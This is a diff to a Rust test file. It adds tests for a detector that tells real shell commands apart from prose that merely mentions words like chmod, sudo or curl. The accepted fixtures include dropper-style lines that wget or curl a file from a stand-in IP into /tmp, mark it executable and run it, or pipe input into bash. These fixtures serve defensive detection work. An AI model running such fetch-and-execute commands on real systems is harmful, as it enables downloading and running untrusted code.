@@ -938,6 +938,36 @@ fn test_is_real_shell_rejects_cli_help_snippet() {
     assert!(!is_real_shell(s));
 }
 
+/// A command word inside a sentence is an instruction to a reader, not a
+/// command: the error text below once became a shell layer, and the host's
+/// basename then satisfied shell-only rules.
+#[test]
+fn test_is_real_shell_rejects_command_word_in_prose() {
+    for prose in [
+        "Reinstall the program, or chmod +x the file directly.",
+        "Please ask your administrator to run sudo for you.",
+        "We could not curl the endpoint; check the proxy.",
+    ] {
+        assert!(!is_real_shell(prose), "{prose}");
+    }
+}
+
+#[test]
+fn test_is_real_shell_accepts_commands_at_command_position() {
+    for shell in [
+        "chmod +x /tmp/a",
+        "cd /tmp; wget http://198.51.100.7/a",
+        "cd /tmp && chmod +x a && ./a",
+        "nohup curl -s http://198.51.100.7/a",
+        "bash -c 'curl http://198.51.100.7/a'",
+        "x=$(curl -s http://198.51.100.7/a)",
+        "echo ready\nsystemctl restart sshd",
+        "printf a | bash",
+    ] {
+        assert!(is_real_shell(shell), "{shell}");
+    }
+}
+
 #[test]
 fn test_script_deobfuscation_layers_powershell_encoded_command() {
     use base64::Engine;
